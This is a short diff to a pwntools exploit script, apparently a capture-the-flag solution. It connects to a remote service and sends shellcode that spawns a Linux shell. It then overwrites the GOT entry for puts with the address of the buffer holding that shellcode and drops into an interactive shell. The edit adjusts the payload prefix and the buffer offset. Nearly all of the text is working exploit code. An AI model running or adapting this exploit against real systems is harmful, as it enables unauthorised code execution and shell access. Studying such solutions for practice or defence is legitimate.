@@ -11,13 +11,12 @@ r = remote(host, port)
 
 put_got = 0x601020
 your_name_addr = 0x6010a0
-where_want_write_addr = 0x40098d
 
 # input('Press enter to continue.')
 
 # what's your name : (48 chars)
 r.recvuntil(':')
-payload = b'flag' + b'\0'
+payload = b'\0'
 payload += asm(pwnlib.shellcraft.linux.sh())
 r.sendline(payload)
 
@@ -27,6 +26,6 @@ r.sendline(hex(put_got).encode())
 
 # data : (8 chars)
 r.recvuntil(':')
-r.sendline(p64(your_name_addr + 5))
+r.sendline(p64(your_name_addr + 1))
 
 r.interactive()
